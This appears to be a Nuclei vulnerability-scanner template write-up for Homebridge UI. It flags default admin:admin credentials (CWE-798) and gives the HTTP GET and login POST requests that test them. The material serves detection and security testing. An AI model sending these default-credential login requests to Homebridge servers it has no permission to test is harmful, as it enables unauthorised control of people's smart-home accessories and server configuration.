# Nuclei Template: Homebridge - Default Admin Credentials
**Template ID:** homebridge-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`homebridge-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Homebridge UI was found using default administrator credentials (admin:admin). An attacker could have gained full access to manage HomeKit accessories, plugins, and server configuration.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /api/auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://github.com/homebridge/homebridge
- https://github.com/homebridge/homebridge-config-ui-x
